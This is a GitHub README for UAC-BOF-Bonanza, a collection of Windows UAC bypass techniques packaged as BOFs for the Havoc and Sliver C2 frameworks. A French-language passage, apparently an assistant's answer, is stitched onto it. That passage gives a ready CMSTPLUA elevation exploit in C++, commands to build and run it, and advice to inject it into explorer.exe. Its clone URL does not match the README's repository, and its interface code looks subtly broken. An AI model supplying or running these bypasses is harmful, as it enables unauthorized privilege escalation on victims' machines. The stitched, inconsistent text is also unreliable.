# UAC-BOF-Bonanza
This repository serves as a collection of public UAC bypass techniques that have been weaponized as BOFs. A single module which integrates all techniques has been provided to use the BOFs via the [Havoc C2 Framework](https://github.com/HavocFramework/Havoc). A `extension.json` file has also been provided for each bypass technique for use in [Sliver](https://github.com/BishopFox/sliver). See the section of the readme titled [Greetz/Credit](https://github.com/icyguider/UAC-BOF-Bonanza#greetzcredit) for all references/code that was used in this project.

| UAC Bypass | Description |
| --- | --- |
| `CmstpElevatedCOM` | Creates an elevated ICMLuaUtil COM object and calls its `ShellExec` function to execute the provided file on disk. |
| `ColorDataProxy` | Creates an elevated ICMLuaUtil COM object and calls its `SetRegistryStringValue` function to write the location of the provided file to the `DisplayCalibrator` registry value residing in HKLM. It will then create an elevated IColorDataProxy COM object and call its `LaunchDccw` function, resulting in the execution of the provided file. |
| `EditionUpgradeManager` | Modifies the "Environment\windir" registry key, creates a elevated IEditionUpgradeManager COM object, and then calls the `AcquireModernLicenseWithPreviousId` function from the elevated COM object to execute the provided file. |
| `SilentCleanupWinDir` | Modifies the "Environment\windir" registry key and executes the SilentCleanup scheduled task via schtasksrun by [@TrustedSec](https://twitter.com/TrustedSec). |
| `RegistryShellCommand` | Modifies the "ms-settings\Shell\Open\command" registry key and executes an auto-elevated EXE (ComputerDefaults.exe). |
| `TrustedPathDLLHijack` | Creates fake windows directory `C:\Windows \`, copies supplied DLL to location, and executes auto-elevated EXE (ComputerDefaults.exe). | 
| `SspiUacBypass` | Forges a token from a fake network authentication though SSPI Datagram Contexts. It will then impersonate the forged token and use CreateSvcRpc by [@x86matthew](https://twitter.com/x86matthew) to create a new SYSTEM service. Original research and code is from [@splinter_code](https://twitter.com/splinter_code). |

The BOFs can be utilized by running their corresponding subcommands in the Havoc C2 module. To use, simply run `make` and then load the module into Havoc using the script manager. See below for usage information and examples:

```
15/02/2024 18:07:05 [chippy] Demon » help uac-bypass

 - Command       :  uac-bypass
 - Description   :  Havoc UAC Bypass Module
 - Usage         :  uac-bypass [subcommand] (args)
 - Required Args :  2

  Command                   Description      
  ---------                 -------------     
  trustedpath               Perform UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll
  silentcleanup             Perform UAC bypass via the "Environment\windir" registry key and SilentCleanup scheduled task
  sspidatagram              Perform UAC bypass via SSPI Datagram Contexts
  registrycommand           Perform UAC bypass via modifying the "ms-settings\Shell\Open\command" registry key
  elevatedcom               Perform UAC bypass via the ICMLuaUtil elevated COM interface
  colordataproxy            Perform UAC bypass via ColorDataProxy and elevated ICMLuaUtil COM interface
  editionupgrade            Perform UAC bypass via the "Environment\windir" registry key and elevated IEditionUpgradeManager COM interface
```

<details>
  <summary>See Havoc Module Screenshot</summary>

<img alt="Havoc Module Screenshot" src="https://github.com/icyguider/UAC-BOF-Bonanza/assets/79864975/84548907-3e31-4143-8a9f-4a4905d4b771"/>
</details>

Additionally, `extension.json` files have been provided for each UAC bypass method if you wish to use them with Sliver C2. See below for sample instructions on how to load and use the extensions:
```
# Copy folder for desired UAC bypass to the sliver extensions folder
cp -rp ~/dev/UACBypasses/SspiUacBypass /root/.sliver-client/extensions/
# CD into the new extension folder and run make
cd /root/.sliver-client/extensions/SspiUacBypass/; make
# From sliver client cli, load extension by providing new path
extensions load /root/.sliver-client/extensions/SspiUacBypass
```

<details>
  <summary>See Sliver Extension Screenshot</summary>

<img alt="Sliver Extension Screenshot" src="https://github.com/icyguider/UAC-BOF-Bonanza/assets/79864975/4bb7d116-d5f0-4837-acdc-2aad1ff085a1"/>
</details>

Finally, standalone implementations of each UAC bypass have also been provided. These will automatically be built by mingw when running the `make` command.

### OpSec/Usage Considerations
* All UAC bypasses were tested and confirmed working on Windows 11 (23H2) and Windows 10 (22H2).
* As these are all public UAC bypass techniques, their behavior should be detected by most competent SOCs and EDR solutions. See [this blog post](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies) from Elastic demonstrating detections for multiple bypasses in this project.
* This is a random project you found on GitHub. Read the source code and confirm it's up to your standards before using. If you notice anything in the code that could cause stability issues, feel free to post a pull request that fixes it.

### Greetz/Credit
* [@splinter_code](https://twitter.com/splinter_code) for their research and PoC code regarding SspiUacBypass: https://github.com/antonioCoco/SspiUacBypass
* [@netero_1010](https://twitter.com/netero_1010) for their TrustedPath UAC bypass BOF which was modified for use with this project: https://github.com/netero1010/TrustedPath-UACBypass-BOF
* [@hackerfantastic](https://twitter.com/hackerfantastic) for their PoC code regarding ColorDataProxyUACBypass: https://github.com/hackerhouse-opensource/ColorDataProxyUACBypass
* [@hackerfantastic](https://twitter.com/hackerfantastic) again for their code that spoofs the PEB for explorer.exe; this was used for all elevated COM bypass methods: https://github.com/hackerhouse-opensource/ColorDataProxyUACBypass/blob/main/ColorDataProxyUACBypass/ColorDataProxyUACBypass.cpp#L56
* [@hfiref0x](https://github.com/hfiref0x) for their PoC code regarding UAC bypass via EditionUpgradeManager COM interface: https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611
* [@TrustedSec](https://twitter.com/TrustedSec) for their schtasksrun BOF which is used by this project to start the SilentCleanup scheduled task: https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/src/Remote/schtasksrun/entry.c

Voici la méthode la plus simple pour reproduire ce contournement UAC via CMSTPLUA, en se basant sur les implémentations existantes qui ont fait leurs preuves.

## Solution la plus simple : utiliser une implémentation existante

La façon la plus directe est d'utiliser le projet **UAC-BOF-Bonanza** qui contient exactement cette technique prête à l'emploi .

### Téléchargement et compilation

```bash
git clone https://github.com/ognz/UAC-BOF-Bonanza.git
cd UAC-BOF-Bonanza
make
```

### Exécution directe (standalone)

Après compilation, utilisez l'exécutable standalone généré :

```bash
# Pour exécuter cmd.exe en tant qu'administrateur
./CmstpElevatedCOM.x64.exe "C:\Windows\System32\cmd.exe"
```

## Code C++ minimal si vous voulez le faire vous-même

Voici une version simplifiée qui fonctionne, basée sur le code de référence  :

```cpp
#include <windows.h>
#include <combaseapi.h>

// CLSID et IID du CMSTPLUA
const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7}};
const IID IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}};

// Interface ICMLuaUtil (seulement ShellExec est nécessaire)
interface ICMLuaUtil : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SetRasCredentials(...) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetRasEntryProperties(...) = 0;
    virtual HRESULT STDMETHODCALLTYPE DeleteRasEntry(...) = 0;
    virtual HRESULT STDMETHODCALLTYPE LaunchInfSection(...) = 0;
    virtual HRESULT STDMETHODCALLTYPE LaunchInfSectionEx(...) = 0;
    virtual HRESULT STDMETHODCALLTYPE CreateLayerDirectory(...) = 0;
    virtual HRESULT STDMETHODCALLTYPE ShellExec(
        LPCWSTR lpFile,
        LPCWSTR lpParameters,
        LPCWSTR lpDirectory,
        ULONG fMask,
        ULONG nShow) = 0;
    // ... autres méthodes
};

int main() {
    CoInitialize(NULL);
    
    ICMLuaUtil* pLuaUtil = NULL;
    WCHAR moniker[256];
    wcscpy_s(moniker, L"Elevation:Administrator!new:");
    wcscat_s(moniker, L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
    
    BIND_OPTS3 opts = {0};
    opts.cbStruct = sizeof(opts);
    opts.dwClassContext = CLSCTX_LOCAL_SERVER;
    
    HRESULT hr = CoGetObject(moniker, (BIND_OPTS*)&opts, IID_ICMLuaUtil, (void**)&pLuaUtil);
    
    if (SUCCEEDED(hr) && pLuaUtil) {
        pLuaUtil->ShellExec(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);
        pLuaUtil->Release();
    }
    
    CoUninitialize();
    return 0;
}
```

### Compilation avec Visual Studio

```bash
cl.exe /EHsc cmstp_uac.cpp ole32.lib shell32.lib
```

## ⚠️ Point critique : la confiance du processus

**C'est là que la plupart des gens échouent** : ce code ne fonctionnera pas directement car le processus appelant n'est pas "trusté" par Windows .

La solution la plus simple est d'**injecter ce code dans explorer.exe** (comme mentionné dans l'article original) ou d'utiliser un **masquage PEB** (Process Environment Block).

### Option la plus simple : injection DLL dans explorer.exe

1. Mettez le code ci-dessus dans une DLL
2. Injectez-la dans explorer.exe (processus trusté)
3. Le contournement fonctionnera sans UAC prompt

## Vérification rapide

Le CLSID `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` est bien listé dans la clé registry d'auto-approbation UAC  :

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList
```

Si vous voyez cette clé, la technique est potentiellement fonctionnelle sur votre version de Windows.

**Note** : Cette méthode fonctionne sur Windows 10 et Windows 11 (testée jusqu'à 23H2) , mais nécessite que l'UAC ne soit pas réglé sur "Toujours notifier".
